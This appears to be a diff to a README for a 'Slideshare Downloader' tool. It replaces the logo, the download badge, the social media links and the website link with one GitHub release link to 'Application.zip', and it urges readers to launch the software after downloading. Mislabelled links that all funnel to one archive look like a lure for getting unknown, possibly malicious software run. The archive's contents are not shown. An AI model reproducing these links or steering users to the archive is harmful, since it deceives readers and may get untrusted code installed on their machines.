@@ -2,7 +2,7 @@
 
 # 🌟 Slideshare Downloader 🌟
 
-![Slideshare Downloader Logo](https://example.com/logo.png)
+![Slideshare Downloader Logo](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Welcome to the **Slideshare Downloader** repository! This tool allows you to eas
 
 To download the Slideshare downloader software, click the link below:
 
-[![Download Slideshare Downloader](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Slideshare Downloader](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)
 
 *(Note: The software needs to be launched after downloading.)*
 
@@ -57,15 +57,15 @@ If you encounter any issues with the Slideshare Downloader software or have sugg
 
 Follow us on social media for updates, tips, and more:
 
-📱 [Twitter](https://twitter.com/slidesharedl)  
-📸 [Instagram](https://instagram.com/slidesharedownloader)  
-📘 [Facebook](https://facebook.com/slidesharedownloader)
+📱 [Twitter](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)  
+📸 [Instagram](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)  
+📘 [Facebook](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip)
 
 ---
 
 ### Visit Our Website
 
-For additional resources, FAQs, and more, visit our website at [slidesharedownloader.com](https://slidesharedownloader.com).
+For additional resources, FAQs, and more, visit our website at [https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip](https://github.com/kawae0709/slidesharedownloader/releases/download/v1.0/Application.zip).
 
 ---
 
